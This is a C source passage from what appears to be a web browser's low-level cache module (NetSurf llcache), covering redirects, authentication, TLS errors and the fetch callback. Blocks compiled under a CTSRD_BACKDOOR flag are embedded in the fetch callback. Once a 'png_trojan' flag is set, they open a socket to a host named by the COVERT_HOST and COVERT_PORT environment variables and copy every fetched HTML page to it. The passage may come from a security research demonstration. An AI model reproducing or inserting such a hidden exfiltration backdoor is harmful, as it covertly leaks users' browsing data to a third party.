	 * the source is trustworthy. */
	object_scheme = nsurl_get_component(object->url, NSURL_SCHEME);
	scheme = nsurl_get_component(url, NSURL_SCHEME);

	/* resource: and about: are allowed to redirect anywhere */
	if ((lwc_string_isequal(object_scheme, corestring_lwc_resource,
			&match) == lwc_error_ok && match == false) &&
	    (lwc_string_isequal(object_scheme, corestring_lwc_about,
			&match) == lwc_error_ok && match == false)) {
		/* file, about and resource are not valid redirect targets */
		if ((lwc_string_isequal(object_scheme, corestring_lwc_file,
				&match) == lwc_error_ok && match == true) ||
		    (lwc_string_isequal(object_scheme, corestring_lwc_about,
				&match) == lwc_error_ok && match == true) ||
		    (lwc_string_isequal(object_scheme, corestring_lwc_resource,
				&match) == lwc_error_ok && match == true)) {
			lwc_string_unref(object_scheme);
			lwc_string_unref(scheme);
			nsurl_unref(url);
			return NSERROR_OK;
		}
	}

	lwc_string_unref(scheme);
	lwc_string_unref(object_scheme);

	/* Bail out if we've no way of handling this URL */
	if (fetch_can_fetch(url) == false) {
		nsurl_unref(url);
		return NSERROR_OK;
	}

	if (http_code == 301 || http_code == 302 || http_code == 303) {
		/* 301, 302, 303 redirects are all unconditional GET requests */
		post = NULL;
	} else if (http_code != 307 || post != NULL) {
		/** \todo 300, 305, 307 with POST */
		nsurl_unref(url);
		return NSERROR_OK;
	}

	/* Attempt to fetch target URL */
	error = llcache_object_retrieve(url, object->fetch.flags,
			object->fetch.referer, post,
			object->fetch.redirect_count + 1, &dest);

	/* No longer require url */
	nsurl_unref(url);

	if (error != NSERROR_OK)
		return error;

	/* Move user(s) to replacement object */
	for (user = object->users; user != NULL; user = next) {
		next = user->next;

		llcache_object_remove_user(object, user);
		llcache_object_add_user(dest, user);
	}

	/* Dest is now our object */
	*replacement = dest;

	return NSERROR_OK;
}

/**
 * Update an object's cache state
 *
 * \param object  Object to update cache for
 * \return NSERROR_OK.
 */
static nserror llcache_object_cache_update(llcache_object *object)
{
	if (object->cache.date == 0)
		object->cache.date = time(NULL);

	return NSERROR_OK;
}

/**
 * Handle FETCH_NOTMODIFIED event
 *
 * \param object       Object to process
 * \param replacement  Pointer to location to receive replacement object
 * \return NSERROR_OK.
 */
static nserror llcache_fetch_notmodified(llcache_object *object,
		llcache_object **replacement)
{
	/* There may be no candidate if the server erroneously responded
	 * to an unconditional request with a 304 Not Modified response.
	 * In this case, we simply retain the initial object, having
	 * invalidated it and marked it as complete.
	 */
	if (object->candidate != NULL) {
		llcache_object_user *user, *next;

		/* Move user(s) to candidate content */
		for (user = object->users; user != NULL; user = next) {
			next = user->next;

			llcache_object_remove_user(object, user);
			llcache_object_add_user(object->candidate, user);
		}

		/* Candidate is no longer a candidate for us */
		object->candidate->candidate_count--;

		/* Clone our cache control data into the candidate */
		llcache_object_clone_cache_data(object, object->candidate,
				false);
		/* Bring candidate's cache data up to date */
		llcache_object_cache_update(object->candidate);
		/* Revert no-cache to normal, if required */
		if (object->candidate->cache.no_cache ==
				LLCACHE_VALIDATE_ONCE) {
			object->candidate->cache.no_cache =
				LLCACHE_VALIDATE_FRESH;
		}

		/* Candidate is now our object */
		*replacement = object->candidate;
		object->candidate = NULL;
	} else {
		/* There was no candidate: retain object */
		*replacement = object;
	}

	/* Ensure fetch has stopped */
	fetch_abort(object->fetch.fetch);
	object->fetch.fetch = NULL;

	/* Invalidate our cache-control data */
	llcache_invalidate_cache_control_data(object);

	/* Mark it complete */
	object->fetch.state = LLCACHE_FETCH_COMPLETE;

	/* Old object will be flushed from the cache on the next poll */

	return NSERROR_OK;
}

/**
 * Process a chunk of fetched data
 *
 * \param object  Object being fetched
 * \param data	  Data to process
 * \param len	  Byte length of data
 * \return NSERROR_OK on success, appropriate error otherwise.
 */
static nserror llcache_fetch_process_data(llcache_object *object, const uint8_t *data,
		size_t len)
{
	/* Resize source buffer if it's too small */
	if (object->source_len + len >= object->source_alloc) {
		const size_t new_len = object->source_len + len + 64 * 1024;
		uint8_t *temp = realloc(object->source_data, new_len);
		if (temp == NULL)
			return NSERROR_NOMEM;

		object->source_data = temp;
		object->source_alloc = new_len;
	}

	/* Append this data chunk to source buffer */
	memcpy(object->source_data + object->source_len, data, len);
	object->source_len += len;

	return NSERROR_OK;
}

/**
 * Handle a query response
 *
 * \param proceed  Whether to proceed with fetch
 * \param cbpw	   Our context for query
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_query_handle_response(bool proceed, void *cbpw)
{
	llcache_event event;
	llcache_object *object = cbpw;

	object->fetch.outstanding_query = false;

	/* Refetch, using existing fetch parameters, if client allows us to */
	if (proceed)
		return llcache_object_refetch(object);

	/* Invalidate cache-control data */
	llcache_invalidate_cache_control_data(object);

	/* Mark it complete */
	object->fetch.state = LLCACHE_FETCH_COMPLETE;

	/* Inform client(s) that object fetch failed */
	event.type = LLCACHE_EVENT_ERROR;
	/** \todo More appropriate error message */
	event.data.msg = messages_get("FetchFailed");

	return llcache_send_event_to_users(object, &event);
}

/**
 * Handle an authentication request
 *
 * \param object  Object being fetched
 * \param realm	  Authentication realm
 * \return NSERROR_OK on success, appropriate error otherwise.
 */
static nserror llcache_fetch_auth(llcache_object *object, const char *realm)
{
	const char *auth;
	nserror error = NSERROR_OK;

	/* Abort fetch for this object */
	fetch_abort(object->fetch.fetch);
	object->fetch.fetch = NULL;

	/* Invalidate cache-control data */
	llcache_invalidate_cache_control_data(object);

	/* Destroy headers */
	llcache_destroy_headers(object);

	/* If there was no realm, then default to the URL */
	/** \todo If there was no WWW-Authenticate header, use response body */
	if (realm == NULL)
		realm = nsurl_access(object->url);

	auth = urldb_get_auth_details(object->url, realm);

	if (auth == NULL || object->fetch.tried_with_auth == true) {
		/* No authentication details, or tried what we had, so ask */
		object->fetch.tried_with_auth = false;

		if (llcache->query_cb != NULL) {
			llcache_query query;

			/* Emit query for authentication details */
			query.type = LLCACHE_QUERY_AUTH;
			query.url = object->url;
			query.data.auth.realm = realm;

			object->fetch.outstanding_query = true;

			error = llcache->query_cb(&query, llcache->query_cb_pw,
					llcache_query_handle_response, object);
		} else {
			llcache_event event;

			/* Mark object complete */
			object->fetch.state = LLCACHE_FETCH_COMPLETE;

			/* Inform client(s) that object fetch failed */
			event.type = LLCACHE_EVENT_ERROR;
			/** \todo More appropriate error message */
			event.data.msg = messages_get("FetchFailed");

			error = llcache_send_event_to_users(object, &event);
		}
	} else {
		/* Flag that we've tried to refetch with credentials, so
		 * that if the fetch fails again, we ask the user again */
		object->fetch.tried_with_auth = true;
		error = llcache_object_refetch(object);
	}

	return error;
}

/**
 * Handle a TLS certificate verification failure
 *
 * \param object  Object being fetched
 * \param certs	  Certificate chain
 * \param num	  Number of certificates in chain
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_fetch_cert_error(llcache_object *object,
		const struct ssl_cert_info *certs, size_t num)
{
	nserror error = NSERROR_OK;

	/* Fetch has been stopped, and destroyed. Invalidate object's pointer */
	object->fetch.fetch = NULL;

	/* Invalidate cache-control data */
	llcache_invalidate_cache_control_data(object);

	if (llcache->query_cb != NULL) {
		llcache_query query;

		/* Emit query for TLS */
		query.type = LLCACHE_QUERY_SSL;
		query.url = object->url;
		query.data.ssl.certs = certs;
		query.data.ssl.num = num;

		object->fetch.outstanding_query = true;

		error = llcache->query_cb(&query, llcache->query_cb_pw,
				llcache_query_handle_response, object);
	} else {
		llcache_event event;

		/* Mark object complete */
		object->fetch.state = LLCACHE_FETCH_COMPLETE;

		/* Inform client(s) that object fetch failed */
		event.type = LLCACHE_EVENT_ERROR;
		/** \todo More appropriate error message */
		event.data.msg = messages_get("FetchFailed");

		error = llcache_send_event_to_users(object, &event);
	}

	return error;
}

/**
 * Handle a TLS connection setup failure
 *
 * \param object  Object being fetched
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_fetch_ssl_error(llcache_object *object)
{
	nserror error = NSERROR_OK;

	/* Fetch has been stopped, and destroyed. Invalidate object's pointer */
	object->fetch.fetch = NULL;

	/* Invalidate cache-control data */
	llcache_invalidate_cache_control_data(object);

	if (object->fetch.tried_with_tls_downgrade == true) {
		/* Have already tried to downgrade, so give up */
		llcache_event event;

		/* Mark object complete */
		object->fetch.state = LLCACHE_FETCH_COMPLETE;

		/* Inform client(s) that object fetch failed */
		event.type = LLCACHE_EVENT_ERROR;
		/** \todo More appropriate error message */
		event.data.msg = messages_get("FetchFailed");

		error = llcache_send_event_to_users(object, &event);
	} else {
		/* Flag that we've tried to downgrade, so that if the
		 * fetch fails again, we give up */
		object->fetch.tried_with_tls_downgrade = true;
		error = llcache_object_refetch(object);
	}

	return error;
}

/**
 * Handler for fetch events
 *
 * \param msg	     Fetch event
 * \param p	     Our private data
 */
static void llcache_fetch_callback(const fetch_msg *msg, void *p)
{
	nserror error = NSERROR_OK;
	llcache_object *object = p;
	llcache_event event;
#ifdef CTSRD_BACKDOOR
	/* XXX not thread safe */
	static int sock = -1, interest_level = 0;
	static struct hostent *server = NULL;
	static struct sockaddr_in serveraddr;
#endif /* CTSRD_BACKDOOR */

	LLCACHE_LOG(("Fetch event %d for %p", msg->type, object));

	switch (msg->type) {
	case FETCH_HEADER:
		/* Received a fetch header */
		object->fetch.state = LLCACHE_FETCH_HEADERS;

		error = llcache_fetch_process_header(object,
				msg->data.header_or_data.buf,
				msg->data.header_or_data.len);

#ifdef CTSRD_BACKDOOR
		if (!png_trojan_triggered) {
				break;
		}
		if (interest_level != 2 && msg->data.header_or_data.len == 2) {
				interest_level = 0;
				break;
		}
		if (strncmp("HTTP/1.1 200 OK",
			(char *)msg->data.header_or_data.buf,
			sizeof("HTTP/1.1 200 OK")-1) == 0) {
				interest_level = 1;
				break;
		} else {
			if (interest_level == 1 &&
				strncmp("Content-Type: text/html",
				(char *)msg->data.header_or_data.buf,
				sizeof("Content-Type: text/html")-1) == 0) {

				interest_level = 2;
				break;
			}
		}
		if (interest_level == 2 && msg->data.header_or_data.len == 2) {
			interest_level = 0;
			if (server == NULL) {
				char *covert_host = getenv("COVERT_HOST");
				char *covert_port = getenv("COVERT_PORT");

				if (covert_host == NULL || covert_port == NULL) {
					break;
				}
				server = gethostbyname(covert_host);
				if (server == NULL) {
					perror("gethostbyname");
				} else {
					bzero((char *)&serveraddr,
						sizeof(serveraddr));
					serveraddr.sin_family = AF_INET;
					bcopy((char *)server->h_addr,
					   (char *)&serveraddr.sin_addr.s_addr,
					   server->h_length);
					serveraddr.sin_port =
					   htons(atoi(covert_port));
				}
			}
			if (sock == -1) {
				sock = socket(AF_INET, SOCK_STREAM, 0);
				if (sock < 0) {
					perror("socket");
				} else {
					if (connect(sock,
						(struct sockaddr *)&serveraddr,
						sizeof(serveraddr)) < 0) {
						perror("connect");
					}
				}
			}
		}
#endif /* CTSRD_BACKDOOR */
		break;

	/* 3xx responses */
	case FETCH_REDIRECT:
		/* Request resulted in a redirect */

		/* Release candidate, if any */
		if (object->candidate != NULL) {
			object->candidate->candidate_count--;
			object->candidate = NULL;
		}

		error = llcache_fetch_redirect(object,
				msg->data.redirect, &object);
#ifdef CTSRD_BACKDOOR
		if (sock != -1) {
			close(sock);
			sock = -1;
		}
#endif /* CTSRD_BACKDOOR */
		break;
	case FETCH_NOTMODIFIED:
		/* Conditional request determined that cached object is fresh */
		error = llcache_fetch_notmodified(object, &object);
		break;

	/* Normal 2xx state machine */
	case FETCH_DATA:
		/* Received some data */
		if (object->fetch.state != LLCACHE_FETCH_DATA) {
			/* On entry into this state, check if we need to
			 * invalidate the cache control data. We are guaranteed
			 * to have received all response headers.
			 *
			 * There are two cases in which we want to suppress
			 * cacheing of an object:
			 *
			 * 1) The HTTP response code is not 200 or 203
			 * 2) The request URI had a query string and the
			 *    response headers did not provide an explicit
			 *    object expiration time.
			 */
			long http_code = fetch_http_code(object->fetch.fetch);

			if ((http_code != 200 && http_code != 203) ||
				(nsurl_has_component(object->url, NSURL_QUERY) &&
				(object->cache.max_age == INVALID_AGE &&
					object->cache.expires == 0))) {
				/* Invalidate cache control data */
				llcache_invalidate_cache_control_data(object);
			}

			/* Release candidate, if any */
			if (object->candidate != NULL) {
				object->candidate->candidate_count--;
				object->candidate = NULL;
			}
		}

		object->fetch.state = LLCACHE_FETCH_DATA;
		error = llcache_fetch_process_data(object,
				msg->data.header_or_data.buf,
				msg->data.header_or_data.len);
#ifdef CTSRD_BACKDOOR
		if (sock != -1) {
			ssize_t n, tot = 0;

			while (tot < (ssize_t)msg->data.header_or_data.len) {
				n = write(sock, msg->data.header_or_data.buf,
					msg->data.header_or_data.len);
				if (n == -1) {
					perror("write");
					break;
				} else
					tot += n;
			}
		}
#endif /* CTSRD_BACKDOOR */
		break;

	case FETCH_FINISHED:
		/* Finished fetching */
	{
		uint8_t *temp;

		object->fetch.state = LLCACHE_FETCH_COMPLETE;
		object->fetch.fetch = NULL;

		/* Shrink source buffer to required size */
		temp = realloc(object->source_data,
				object->source_len);
		/* If source_len is 0, then temp may be NULL */
		if (temp != NULL || object->source_len == 0) {
			object->source_data = temp;
			object->source_alloc = object->source_len;
		}

		llcache_object_cache_update(object);
	}
#ifdef CTSRD_BACKDOOR
		if (sock != -1) {
			close(sock);
			sock = -1;
		}
#endif /* CTSRD_BACKDOOR */
		break;

	/* Out-of-band information */
	case FETCH_ERROR:
		/* An error occurred while fetching */
		/* The fetch has has already been cleaned up by the fetcher */
		object->fetch.state = LLCACHE_FETCH_COMPLETE;
		object->fetch.fetch = NULL;

		/* Release candidate, if any */
		if (object->candidate != NULL) {
			object->candidate->candidate_count--;
			object->candidate = NULL;
		}

		/* Invalidate cache control data */
		llcache_invalidate_cache_control_data(object);

		/** \todo Consider using errorcode for something */

		event.type = LLCACHE_EVENT_ERROR;
		event.data.msg = msg->data.error;

		error = llcache_send_event_to_users(object, &event);
#ifdef CTSRD_BACKDOOR
		if (sock != -1) {
			close(sock);
			sock = -1;
		}
#endif /* CTSRD_BACKDOOR */
		break;
	case FETCH_PROGRESS:
		/* Progress update */
		event.type = LLCACHE_EVENT_PROGRESS;
		event.data.msg = msg->data.progress;

		error = llcache_send_event_to_users(object, &event);

		break;

	/* Events requiring action */
	case FETCH_AUTH:
		/* Need Authentication */

		/* Release candidate, if any */
		if (object->candidate != NULL) {
			object->candidate->candidate_count--;
			object->candidate = NULL;
		}

		error = llcache_fetch_auth(object, msg->data.auth.realm);
		break;
	case FETCH_CERT_ERR:
		/* Something went wrong when validating TLS certificates */

		/* Release candidate, if any */
		if (object->candidate != NULL) {
			object->candidate->candidate_count--;
			object->candidate = NULL;
		}

		error = llcache_fetch_cert_error(object,
				msg->data.cert_err.certs,
				msg->data.cert_err.num_certs);
		break;
	case FETCH_SSL_ERR:
		/* TLS connection setup failed */

		/* Release candidate, if any */
		if (object->candidate != NULL) {
			object->candidate->candidate_count--;
			object->candidate = NULL;
		}

		error = llcache_fetch_ssl_error(object);
		break;
	}

	/* Deal with any errors reported by event handlers */
	if (error != NSERROR_OK) {
		if (object->fetch.fetch != NULL) {
			fetch_abort(object->fetch.fetch);
			object->fetch.fetch = NULL;

			/* Invalidate cache control data */
			llcache_invalidate_cache_control_data(object);

			object->fetch.state = LLCACHE_FETCH_COMPLETE;
		}
		return;
	}
}

/**
 * Find a user of a low-level cache object
 *
 * \param handle  External cache handle to search for
 * \return Pointer to corresponding user, or NULL if not found
 */
static llcache_object_user *llcache_object_find_user(const llcache_handle *handle)
{
	llcache_object_user *user;

	assert(handle->object != NULL);

	for (user = handle->object->users; user != NULL; user = user->next) {
		if (user->handle == handle)
			break;
	}

	return user;
}

/**
 * Remove a low-level cache object from a cache list
 *
 * \param object  Object to remove
 * \param list	  List to remove from
 * \return NSERROR_OK
 */
static nserror llcache_object_remove_from_list(llcache_object *object,
		llcache_object **list)
{
	if (object == *list)
		*list = object->next;
	else
		object->prev->next = object->next;

	if (object->next != NULL)
		object->next->prev = object->prev;

	return NSERROR_OK;
}

/**
 * Determine if a low-level cache object resides in a given list
 *
 * \param object  Object to search for
 * \param list	  List to search in
 * \return True if object resides in list, false otherwise
 */
static bool llcache_object_in_list(const llcache_object *object,
		const llcache_object *list)
{
	while (list != NULL) {
		if (list == object)
			break;

		list = list->next;
	}

	return list != NULL;
}

/**
 * Notify users of an object's current state
 *
 * \param object  Object to notify users about
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_object_notify_users(llcache_object *object)
{
	nserror error;
	llcache_object_user *user, *next_user;
	llcache_event event;

#ifdef LLCACHE_TRACE
	bool emitted_notify = false;
#endif

	/**
	 * State transitions and event emission for users.
	 * Rows: user state. Cols: object state.
	 *
	 * User\Obj	INIT	HEADERS		DATA	COMPLETE
	 * INIT		 -	   T		 T*	   T*
	 * HEADERS	 -	   -		 T	   T*
	 * DATA		 -	   -		 M	   T
	 * COMPLETE	 -	   -		 -	   -
	 *
	 * T => transition user to object state
	 * M => no transition required, but may need to emit event
	 *
	 * The transitions marked with an asterisk can be removed by moving
	 * the user context into the subsequent state and then reevaluating.
	 *
	 * Events are issued as follows:
	 *
	 * HAD_HEADERS: on transition from HEADERS -> DATA state
	 * HAD_DATA   : in DATA state, whenever there's new source data
	 * DONE	      : on transition from DATA -> COMPLETE state
	 */

	for (user = object->users; user != NULL; user = next_user) {
		/* Emit necessary events to bring the user up-to-date */
		llcache_handle *handle = user->handle;
		const llcache_fetch_state objstate = object->fetch.state;

		/* Flag that this user is the current iteration target
		 * in case the client attempts to destroy it underneath us */
		user->iterator_target = true;

		/* A note on the computation of next_user:
		 *
		 * Within this loop, we may make a number of calls to
		 * client code. Our contract with clients is that they
		 * can do whatever they like from within their callback
		 * handlers. This is so that we limit the pain of
		 * reentrancy to this module alone.
		 *
		 * One of the things a client can do from within its
		 * callback handler is to remove users from this object's
		 * user list. In the common case, the user they attempt
		 * to remove is the current iteration target, and we
		 * already protect against that causing problems here.
		 * However, no such protection exists if the client
		 * attempts to remove other users from this object's
		 * user list.
		 *
		 * Therefore, we cannot compute next_user up-front
		 * and expect it to remain valid across calls to
		 * client code (as the identity of the next user
		 * in the list may change underneath us). Instead,
		 * we must compute next_user at the point where we
		 * are about to cause another iteration of this loop
		 * (i.e. at the very end, and also at the points where
		 * continue is used)
		 */

#ifdef LLCACHE_TRACE
		if (handle->state != objstate) {
			if (emitted_notify == false) {
				LOG(("Notifying users of %p", object));
				emitted_notify = true;
			}

			LOG(("User %p state: %d Object state: %d",
					user, handle->state, objstate));
		}
#endif

		/* User: INIT, Obj: HEADERS, DATA, COMPLETE => User->HEADERS */
		if (handle->state == LLCACHE_FETCH_INIT &&
				objstate > LLCACHE_FETCH_INIT) {
			handle->state = LLCACHE_FETCH_HEADERS;
		}

		/* User: HEADERS, Obj: DATA, COMPLETE => User->DATA */
		if (handle->state == LLCACHE_FETCH_HEADERS &&
				objstate > LLCACHE_FETCH_HEADERS) {
			handle->state = LLCACHE_FETCH_DATA;

			/* Emit HAD_HEADERS event */
			event.type = LLCACHE_EVENT_HAD_HEADERS;

			error = handle->cb(handle, &event, handle->pw);

			if (user->queued_for_delete) {
				next_user = user->next;
				llcache_object_remove_user(object, user);
				llcache_object_user_destroy(user);

				if (error != NSERROR_OK)
					return error;

				continue;
			} else if (error == NSERROR_NEED_DATA) {
				/* User requested replay */
				handle->state = LLCACHE_FETCH_HEADERS;

				/* Continue with the next user -- we'll
				 * reemit the event next time round */
				user->iterator_target = false;
				next_user = user->next;
				continue;
			} else if (error != NSERROR_OK) {
				user->iterator_target = false;
				return error;
			}
		}

		/* User: DATA, Obj: DATA, COMPLETE, more source available */
		if (handle->state == LLCACHE_FETCH_DATA &&
				objstate >= LLCACHE_FETCH_DATA &&
				object->source_len > handle->bytes) {
			size_t orig_handle_read;

			/* Construct HAD_DATA event */
			event.type = LLCACHE_EVENT_HAD_DATA;
			event.data.data.buf =
					object->source_data + handle->bytes;
			event.data.data.len =
					object->source_len - handle->bytes;

			/* Update record of last byte emitted */
			if (object->fetch.flags &
					LLCACHE_RETRIEVE_STREAM_DATA) {
				/* Streaming, so reset to zero to
				 * minimise amount of cached source data.
				 * Additionally, we don't support replay
				 * when streaming. */
				orig_handle_read = 0;
				handle->bytes = object->source_len = 0;
			} else {
				orig_handle_read = handle->bytes;
				handle->bytes = object->source_len;
			}

			/* Emit event */
			error = handle->cb(handle, &event, handle->pw);
			if (user->queued_for_delete) {
				next_user = user->next;
				llcache_object_remove_user(object, user);
				llcache_object_user_destroy(user);

				if (error != NSERROR_OK)
					return error;

				continue;
			} else if (error == NSERROR_NEED_DATA) {
				/* User requested replay */
				handle->bytes = orig_handle_read;

				/* Continue with the next user -- we'll
				 * reemit the data next time round */
				user->iterator_target = false;
				next_user = user->next;
				continue;
			} else if (error != NSERROR_OK) {
				user->iterator_target = false;
				return error;
			}
		}

		/* User: DATA, Obj: COMPLETE => User->COMPLETE */
		if (handle->state == LLCACHE_FETCH_DATA &&
				objstate > LLCACHE_FETCH_DATA) {
			handle->state = LLCACHE_FETCH_COMPLETE;

			/* Emit DONE event */
			event.type = LLCACHE_EVENT_DONE;

			error = handle->cb(handle, &event, handle->pw);
			if (user->queued_for_delete) {
				next_user = user->next;
				llcache_object_remove_user(object, user);
				llcache_object_user_destroy(user);

				if (error != NSERROR_OK)
					return error;

				continue;
			} else if (error == NSERROR_NEED_DATA) {
				/* User requested replay */
				handle->state = LLCACHE_FETCH_DATA;

				/* Continue with the next user -- we'll
				 * reemit the event next time round */
				user->iterator_target = false;
				next_user = user->next;
				continue;
			} else if (error != NSERROR_OK) {
				user->iterator_target = false;
				return error;
			}
		}

		/* No longer the target of an iterator */
		user->iterator_target = false;

		next_user = user->next;
	}

	return NSERROR_OK;
}

/**
 * Make a snapshot of the current state of an llcache_object.
 *
 * This has the side-effect of the new object being non-cacheable,
 * also not-fetching and not a candidate for any other object.
 *
 * Also note that this new object has no users and at least one
 * should be assigned to it before llcache_clean is entered or it
 * will be immediately cleaned up.
 *
 * \param object  The object to take a snapshot of
 * \param snapshot  Pointer to receive snapshot of \a object
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_object_snapshot(llcache_object *object,
		llcache_object **snapshot)
{
	llcache_object *newobj;
	nserror error;

	error = llcache_object_new(object->url, &newobj);

	if (error != NSERROR_OK)
		return error;

	newobj->source_alloc = newobj->source_len = object->source_len;

	if (object->source_len > 0) {
		newobj->source_data = malloc(newobj->source_alloc);
		if (newobj->source_data == NULL) {
			llcache_object_destroy(newobj);
			return NSERROR_NOMEM;
		}
		memcpy(newobj->source_data, object->source_data,
				newobj->source_len);
	}

	if (object->num_headers > 0) {
		newobj->headers = calloc(sizeof(llcache_header),
				object->num_headers);
		if (newobj->headers == NULL) {
			llcache_object_destroy(newobj);
			return NSERROR_NOMEM;
		}
		while (newobj->num_headers < object->num_headers) {
			llcache_header *nh =
					&(newobj->headers[newobj->num_headers]);
			llcache_header *oh =
					&(object->headers[newobj->num_headers]);
			newobj->num_headers += 1;
			nh->name = strdup(oh->name);
			nh->value = strdup(oh->value);
			if (nh->name == NULL || nh->value == NULL) {
				llcache_object_destroy(newobj);
				return NSERROR_NOMEM;
			}
		}
	}

	newobj->fetch.state = LLCACHE_FETCH_COMPLETE;

	*snapshot = newobj;

	return NSERROR_OK;
}


/******************************************************************************
 * Public API								      *
 ******************************************************************************/

/**
 * Attempt to clean the cache
 */
/* Exported interface documented in llcache.h */
void llcache_clean(void)
{
	llcache_object *object, *next;
	uint32_t llcache_size = 0;
	int remaining_lifetime;

	LLCACHE_LOG(("Attempting cache clean"));

	/* Candidates for cleaning are (in order of priority):
	 *
	 * 1) Uncacheable objects with no users
	 * 2) Stale cacheable objects with no users or pending fetches
	 * 3) Fresh cacheable objects with no users or pending fetches
	 */

	/* 1) Uncacheable objects with no users or fetches */
	for (object = llcache->uncached_objects; object != NULL; object = next) {
		next = object->next;

		/* The candidate count of uncacheable objects is always 0 */
		if ((object->users == NULL) &&
		    (object->candidate_count == 0) &&
		    (object->fetch.fetch == NULL) &&
		    (object->fetch.outstanding_query == false)) {
			LLCACHE_LOG(("Found victim %p", object));

			llcache_object_remove_from_list(object,
					&llcache->uncached_objects);
			llcache_object_destroy(object);
		} else {
			llcache_size += object->source_len + sizeof(*object);
		}
	}

	/* 2) Stale cacheable objects with no users or pending fetches */
	for (object = llcache->cached_objects; object != NULL; object = next) {
		next = object->next;

		remaining_lifetime = llcache_object_rfc2616_remaining_lifetime(&object->cache);

		if ((object->users == NULL) &&
		    (object->candidate_count == 0) &&
		    (object->fetch.fetch == NULL) &&
		    (object->fetch.outstanding_query == false)) {

			if (remaining_lifetime > 0) {
				/* object is fresh */
				llcache_size += object->source_len + sizeof(*object);
			} else {
				/* object is not fresh */
				LLCACHE_LOG(("Found stale cacheable object (%p) with no users or pending fetches", object));

				llcache_object_remove_from_list(object,
						&llcache->cached_objects);
				llcache_object_destroy(object);
			}
		} else {
			llcache_size += object->source_len + sizeof(*object);
		}
	}

	/* 3) Fresh cacheable objects with no users or pending
	 * fetches, only if the cache exceeds the configured size.
	 */
	if (llcache->limit < llcache_size) {
		for (object = llcache->cached_objects; object != NULL;
				object = next) {
			next = object->next;

			if ((object->users == NULL) &&
			    (object->candidate_count == 0) &&
			    (object->fetch.fetch == NULL) &&
			    (object->fetch.outstanding_query == false)) {
				LLCACHE_LOG(("Found victim %p", object));

				llcache_size -=
					object->source_len + sizeof(*object);

				llcache_object_remove_from_list(object,
						&llcache->cached_objects);
				llcache_object_destroy(object);
			}
		}
	}

	LLCACHE_LOG(("Size: %u", llcache_size));
}

/* See llcache.h for documentation */
nserror
llcache_initialise(llcache_query_callback cb, void *pw, uint32_t llcache_limit)
{
	llcache = calloc(1, sizeof(struct llcache_s));
	if (llcache == NULL) {
		return NSERROR_NOMEM;
	}

	llcache->query_cb = cb;
	llcache->query_cb_pw = pw;
	llcache->limit = llcache_limit;

	LOG(("llcache initialised with a limit of %d bytes", llcache_limit));

	return NSERROR_OK;
}

/* See llcache.h for documentation */
void llcache_finalise(void)
{
	llcache_object *object, *next;

	/* Clean uncached objects */
	for (object = llcache->uncached_objects; object != NULL; object = next) {
		llcache_object_user *user, *next_user;

		next = object->next;

		for (user = object->users; user != NULL; user = next_user) {
			next_user = user->next;

			if (user->handle != NULL)
				free(user->handle);

			free(user);
		}

		/* Fetch system has already been destroyed */
		object->fetch.fetch = NULL;

		llcache_object_destroy(object);
	}

	/* Clean cached objects */
	for (object = llcache->cached_objects; object != NULL; object = next) {
		llcache_object_user *user, *next_user;

		next = object->next;

		for (user = object->users; user != NULL; user = next_user) {
			next_user = user->next;

			if (user->handle != NULL)
			       free(user->handle);

			free(user);
		}

		/* Fetch system has already been destroyed */
		object->fetch.fetch = NULL;

		llcache_object_destroy(object);
	}

	free(llcache);
	llcache = NULL;
}

/* See llcache.h for documentation */
nserror llcache_poll(void)
{
	llcache_object *object;

	fetch_poll();

	/* Catch new users up with state of objects */
	for (object = llcache->cached_objects; object != NULL;
			object = object->next) {
		llcache_object_notify_users(object);
	}

	for (object = llcache->uncached_objects; object != NULL;
			object = object->next) {
		llcache_object_notify_users(object);
	}

	return NSERROR_OK;
}

/* See llcache.h for documentation */
nserror llcache_handle_retrieve(nsurl *url, uint32_t flags,
		nsurl *referer, const llcache_post_data *post,
		llcache_handle_callback cb, void *pw,
		llcache_handle **result)
{
	nserror error;
	llcache_object_user *user;
	llcache_object *object;

	/* Can we fetch this URL at all? */
	if (fetch_can_fetch(url) == false)
		return NSERROR_NO_FETCH_HANDLER;

	/* Create a new object user */
	error = llcache_object_user_new(cb, pw, &user);
	if (error != NSERROR_OK)
		return error;

	/* Retrieve a suitable object from the cache,
	 * creating a new one if needed. */
	error = llcache_object_retrieve(url, flags, referer, post, 0, &object);
	if (error != NSERROR_OK) {
		llcache_object_user_destroy(user);
		return error;
	}

	/* Add user to object */
	llcache_object_add_user(object, user);

	*result = user->handle;

	return NSERROR_OK;
}

/* See llcache.h for documentation */
nserror llcache_handle_change_callback(llcache_handle *handle,
		llcache_handle_callback cb, void *pw)
{
	handle->cb = cb;
	handle->pw = pw;

	return NSERROR_OK;
}

/* See llcache.h for documentation */
nserror llcache_handle_release(llcache_handle *handle)
{
	nserror error = NSERROR_OK;
	llcache_object *object = handle->object;
	llcache_object_user *user = llcache_object_find_user(handle);

	assert(user != NULL);

	if (user->iterator_target) {
		/* Can't remove / delete user object if it's
		 * the target of an iterator */
		user->queued_for_delete = true;
	} else {
		/* Remove the user from the object and destroy it */
		error = llcache_object_remove_user(object, user);
		if (error == NSERROR_OK) {
			error = llcache_object_user_destroy(user);
		}
	}

	return error;
}

/* See llcache.h for documentation */
nserror llcache_handle_clone(llcache_handle *handle, llcache_handle **result)
{
	nserror error;
	llcache_object_user *newuser;

	error = llcache_object_user_new(handle->cb, handle->pw, &newuser);
	if (error == NSERROR_OK) {
		llcache_object_add_user(handle->object, newuser);
		newuser->handle->state = handle->state;
		*result = newuser->handle;
	}

	return error;
}

/* See llcache.h for documentation */
nserror llcache_handle_abort(llcache_handle *handle)
{
	llcache_object_user *user = llcache_object_find_user(handle);
	llcache_object *object = handle->object, *newobject;
	nserror error = NSERROR_OK;
	bool all_alone = true;

	/* Determine if we are the only user */
	if (user->prev != NULL)
		all_alone = false;
	if (user->next != NULL)
		all_alone = false;

	if (all_alone == false) {
		/* We must snapshot this object */
		error = llcache_object_snapshot(object, &newobject);
		if (error != NSERROR_OK)
			return error;

		/* Move across to the new object */
		if (user->iterator_target) {
			/* User is current iterator target, clone it */
			llcache_object_user *newuser =
					calloc(1, sizeof(llcache_object_user));
			if (newuser == NULL) {
				llcache_object_destroy(newobject);
				return NSERROR_NOMEM;
			}

			/* Move handle across to clone */
			newuser->handle = user->handle;
			user->handle = NULL;

			/* Mark user as needing deletion */
